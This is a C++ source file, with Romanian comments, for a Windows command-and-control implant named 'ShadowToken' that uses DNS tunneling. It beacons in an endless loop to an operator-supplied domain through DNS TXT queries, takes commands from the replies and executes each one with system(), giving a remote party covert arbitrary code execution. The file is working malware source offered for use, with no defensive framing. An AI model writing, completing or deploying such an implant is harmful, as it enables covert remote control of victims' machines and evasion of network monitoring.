#include <Windows.h>
#include <WinDNS.h>
#include <iostream>
#include <string>
#include <vector>

#pragma comment(lib, "Dnsapi.lib")

namespace ShadowToken {

    class C2_DNS {
    public:
        C2_DNS(const std::string& domain, int interval)
            : c2Domain(domain), beaconInterval(interval) {}

        // Începe comunicarea C2 prin DNS tunneling
        void StartBeacon() {
            while (true) {
                std::string beaconResponse = SendBeacon();
                if (!beaconResponse.empty()) {
                    ExecuteCommand(beaconResponse);
                }
                Sleep(beaconInterval * 1000);  // Beacon la intervale specificate
            }
        }

    private:
        std::string c2Domain;
        int beaconInterval;

        // Trimite un beacon la serverul C2 prin DNS și așteaptă răspunsul
        std::string SendBeacon() {
            std::string subdomain = GenerateBeaconSubdomain();
            std::string fullQuery = subdomain + "." + c2Domain;

            PDNS_RECORD dnsRecord;
            DNS_STATUS status = DnsQuery_A(fullQuery.c_str(), DNS_TYPE_TEXT, DNS_QUERY_STANDARD, nullptr, &dnsRecord, nullptr);

            std::string response;
            if (status == 0 && dnsRecord) {
                if (dnsRecord->wType == DNS_TYPE_TEXT) {
                    for (unsigned int i = 0; i < dnsRecord->Data.Txt.dwStringCount; ++i) {
                        response += dnsRecord->Data.Txt.pStringArray[i];
                    }
                }
                DnsRecordListFree(dnsRecord, DnsFreeRecordList);
            } else {
                std::cerr << "[Error] Nu s-a putut trimite beacon-ul DNS: " << GetLastError() << std::endl;
            }

            return response;
        }

        // Generează un subdomeniu unic pentru a marca fiecare beacon trimis
        std::string GenerateBeaconSubdomain() {
            SYSTEMTIME st;
            GetSystemTime(&st);
            char buffer[30];
            sprintf_s(buffer, sizeof(buffer), "beacon-%04d%02d%02d%02d%02d%02d", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
            return std::string(buffer);
        }

        // Execută comanda primită de la serverul C2
        void ExecuteCommand(const std::string& command) {
            std::cout << "[C2 Command Received] Executing: " << command << std::endl;
            system(command.c_str());
        }
    };
}
